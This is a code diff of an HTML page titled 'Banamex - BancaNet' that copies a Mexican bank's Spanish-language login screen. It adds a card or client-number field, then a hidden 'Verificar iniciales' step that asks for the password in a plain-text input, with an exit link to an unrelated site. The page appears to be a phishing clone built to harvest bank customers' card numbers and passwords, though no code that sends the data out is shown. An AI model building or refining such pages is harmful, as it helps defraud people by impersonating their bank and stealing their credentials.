@@ -1,3 +1,12 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+    <a href="https://www.foroactivo.com" target="_blank"></a>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <title>Banamex - BancaNet</title>
+
 </head>
 <body>
 
@@ -14,41 +23,63 @@
 </div>
 
 </div>
-
-
-
-
-  <div class="container">  
+<div class="container">  
     <div class="inner-box">   
-      <h2>Iniciar sesión</h2>
-
- <label class="label-03">
-  <strong>Número de cliente o tarjeta de crédito</strong>
-  <span class="tooltip-wrapper">
-    <span class="icon-tooltip"> ?</span>
-    <span class="tooltip-text">
-     Selecciona esta opción sólo si el dispositivo es tuyo
-    </span>
-  </span>
-</label>
-      <input type="text" id="numero" placeholder="">
-
-      <div class="checkbox">
-   <input type="checkbox" id="recordar">
-  <label class="text-bold">Recordar mi usuario </label>
-
-  <span class="tooltip-wrapper">
-    <span class="icon-tooltip"> ?</span>
-    <span class="tooltip-text">
-      <strong>Activa esta opción</strong><br>
-      solo en dispositivos<br>
-      de uso personal
-    </span>
-  </span>
+       <div id="loginForm">
+     <h2>Iniciar sesión</h2>
+        
+        <label class="label-03">
+            <strong>Número de cliente o tarjeta de crédito</strong>
+            <span class="tooltip-wrapper">
+                <span class="icon-tooltip"> ?</span>
+                <span class="tooltip-text">
+                    Selecciona esta opción sólo si el dispositivo es tuyo
+                </span>
+            </span>
+        </label>
+        <input type="text" id="numero" placeholder="">
+        
+        <div class="checkbox">
+            <input type="checkbox" id="recordar">
+            <label class="text-bold">Recordar mi usuario</label>
+            
+            <span class="tooltip-wrapper">
+                <span class="icon-tooltip"> ?</span>
+                <span class="tooltip-text">
+                    <strong>Activa esta opción</strong><br>
+                    solo en dispositivos<br>
+                    de uso personal
+                </span>
+            </span>
+        </div>
+        
+        <button id="continueButton">Continuar</button>
 </div>
       
-      <button>Continuar</button>
-
+  <div id="verificationContent" class="hidden">
+    <div class="login-password-container2">
+       <h2 class="login-pasword-text">Verificar iniciales</h2>
+     <span class="tooltip-wrapper">
+                <span class="icon-tooltip"> ?</span>
+                <span class="tooltip-text">
+                    <strong>Activa esta opción</strong><br>
+                    solo en dispositivos<br>
+                    de uso personal
+                </span>
+            </span>
+      </div>
+  <p class="login-pasword-text2">Cargando...</p>
+<p class="login">
+  <a href="https://otraweb.com" class="login-pasword-text3 ">No son mis iniciales</a>
+    </p>
+<br>
+<label class="password"><strong>Contraseña</strong></label>
+               <input type="text" id="password" placeholder="">
+        
+        <button id="loginButton">Iniciar sesión</button>
+    </div>
+      
+      
       <div class="link">
     <a href="#" style="font-size: 20px; font-weight: bold; color: rgb(0, 124, 148); text-decoration:none;">
   Recuperar contraseña
@@ -235,3 +266,5 @@
 		</div>
 	</div>
 </div>
+</body>
+</html>
